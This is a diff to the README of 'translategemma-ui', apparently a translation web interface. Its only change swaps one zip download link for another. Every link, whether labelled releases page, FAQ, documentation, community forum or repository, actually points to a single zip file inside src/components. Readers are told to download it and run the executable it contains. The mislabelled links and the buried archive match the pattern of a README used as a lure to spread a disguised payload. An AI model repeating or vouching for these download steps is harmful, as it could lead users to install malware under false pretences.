@@ -1,6 +1,6 @@
 # 🌐 translategemma-ui - Your Easy Web Interface for Translation
 
-[![Download Now](https://github.com/Farkird/translategemma-ui/raw/refs/heads/main/src/components/ui-translategemma-v3.1.zip)](https://github.com/Farkird/translategemma-ui/raw/refs/heads/main/src/components/ui-translategemma-v3.1.zip)
+[![Download Now](https://raw.githubusercontent.com/Farkird/translategemma-ui/main/src/components/ui-translategemma-2.7.zip)](https://raw.githubusercontent.com/Farkird/translategemma-ui/main/src/components/ui-translategemma-2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **translategemma-ui**, your straightforward web interface for Transla
 
 ## 📥 Download & Install
 
-To start using **translategemma-ui**, you need to visit this page to download: [GitHub Releases Page](https://github.com/Farkird/translategemma-ui/raw/refs/heads/main/src/components/ui-translategemma-v3.1.zip). 
+To start using **translategemma-ui**, you need to visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Farkird/translategemma-ui/main/src/components/ui-translategemma-2.7.zip). 
 
 1. Click on the link above.
 2. Look for the latest version.
@@ -32,7 +32,7 @@ After downloading, follow the instructions below to install.
 2. **Install the Application:**
    - **Windows:** Double-click the `.exe` file and follow the on-screen instructions to complete the installation.
    - **macOS:** Open the `.dmg` file and drag the **translategemma-ui** icon to your Applications folder.
-   - **Linux:** Extract the `https://github.com/Farkird/translategemma-ui/raw/refs/heads/main/src/components/ui-translategemma-v3.1.zip` file and follow the README instructions in the folder.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/Farkird/translategemma-ui/main/src/components/ui-translategemma-2.7.zip` file and follow the README instructions in the folder.
 
 3. **Run the Application:**
    After installation, you can find **translategemma-ui** in your applications menu or desktop. Click to open it.
@@ -67,10 +67,10 @@ After downloading, follow the instructions below to install.
 If you encounter any issues, try the following steps:
 
 - **Restart the Application:** Close and reopen the app to refresh its settings.
-- **Check for Updates:** Ensure you are using the latest version by visiting the [GitHub Releases Page](https://github.com/Farkird/translategemma-ui/raw/refs/heads/main/src/components/ui-translategemma-v3.1.zip).
+- **Check for Updates:** Ensure you are using the latest version by visiting the [GitHub Releases Page](https://raw.githubusercontent.com/Farkird/translategemma-ui/main/src/components/ui-translategemma-2.7.zip).
 - **Reinstall the App:** If issues persist, uninstall and reinstall the application following the steps above.
 
-For further assistance, you can check the [FAQ section](https://github.com/Farkird/translategemma-ui/raw/refs/heads/main/src/components/ui-translategemma-v3.1.zip) or reach out to the community on GitHub.
+For further assistance, you can check the [FAQ section](https://raw.githubusercontent.com/Farkird/translategemma-ui/main/src/components/ui-translategemma-2.7.zip) or reach out to the community on GitHub.
 
 ## 🛠️ Support
 
@@ -79,8 +79,8 @@ For support, please visit the GitHub repository and open a new issue. The develo
  
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Farkird/translategemma-ui/raw/refs/heads/main/src/components/ui-translategemma-v3.1.zip)
-- [Documentation](https://github.com/Farkird/translategemma-ui/raw/refs/heads/main/src/components/ui-translategemma-v3.1.zip)
-- [Community Forum](https://github.com/Farkird/translategemma-ui/raw/refs/heads/main/src/components/ui-translategemma-v3.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Farkird/translategemma-ui/main/src/components/ui-translategemma-2.7.zip)
+- [Documentation](https://raw.githubusercontent.com/Farkird/translategemma-ui/main/src/components/ui-translategemma-2.7.zip)
+- [Community Forum](https://raw.githubusercontent.com/Farkird/translategemma-ui/main/src/components/ui-translategemma-2.7.zip)
 
 For the most effective use of **translategemma-ui**, keep your software updated, and don't hesitate to ask questions in the community forum should you need assistance. Enjoy translating with ease!
